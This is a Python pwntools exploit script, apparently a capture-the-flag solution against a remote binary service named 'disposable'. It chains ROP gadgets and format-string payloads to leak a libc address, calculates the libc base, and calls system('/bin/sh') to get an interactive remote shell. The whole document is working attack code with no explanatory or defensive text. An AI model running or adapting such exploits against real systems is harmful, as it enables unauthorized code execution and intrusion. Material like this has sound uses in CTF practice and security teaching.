from pwn import *
import json

a = {
    'apikey' : 'key',
}
libc = ELF('./libc.so.6')
#r = process('./disposable', env={'LD_PRELOAD': './libc.so.6'})
r = remote('disposable.eatpwnnosleep.com', 30020)
r.sendline(json.dumps(a).encode())

puts = 0x4006f0
printf = 0x400710
scanf = 0x400780
poprbp = 0x0000000000400800
poprdi = 0x00000000004012f3
poprsi = 0x00000000004012f1
ppr = 0x4012f0
leaveret = 0x000000000040109d
ret = 0x00000000004006c1
bss = 0x602100
bss2 = 0x610000

r.sendlineafter('> ', '2')
pay = p64(poprdi) + p64(bss+0x30) + p64(scanf) + p64(poprbp) + p64(bss2) + p64(leaveret) + "%6$s"
r.sendlineafter(': ', '123')
r.sendlineafter(': ', pay)

r.sendlineafter('> ', '1')
r.sendlineafter(': ', '123')
r.sendlineafter(': ', pay)

for _ in xrange(7):
    r.sendlineafter('> ', '2')

r.sendlineafter('> ', '1')
r.sendlineafter('? ', '321')
pay = 'a'*0x24 + p64(ppr)
pay = pay.ljust(0x98, '\x00') + p32(4)

r.sendlineafter(': ', pay)
sleep(1)
r.sendlineafter('> ', '4')
pay = 'a'*8
pay += p64(poprdi) + p64(bss2+0x300) + p64(poprsi) + p64(bss2+0x40) +'d'*8 + p64(printf)
pay += p64(poprdi) + p64(0x602118) + p64(puts)
pay += p64(ret) # for alignment
pay += p64(poprdi) + p64(bss2+0x350) + p64(poprsi) + p64(bss2+0x88) + 'd'*8 + p64(scanf) 
pay = pay.ljust(0x300, '\x00') + '%{}c%1$hnEND'.format(0x2020)
pay = pay.ljust(0x350, '\x00') + '%s'
r.sendline(pay)

r.recvuntil('END')
libc.address = u64(r.recvline()[:-1].ljust(8, '\x00')) - libc.symbols['puts']
log.info('LIBC BASE: 0x{:016X}'.format(libc.address))

system = libc.symbols['system']
binsh = list(libc.search('/bin/sh'))[0]
r.sendline(p64(poprdi)+p64(binsh)+p64(system))

r.interactive()
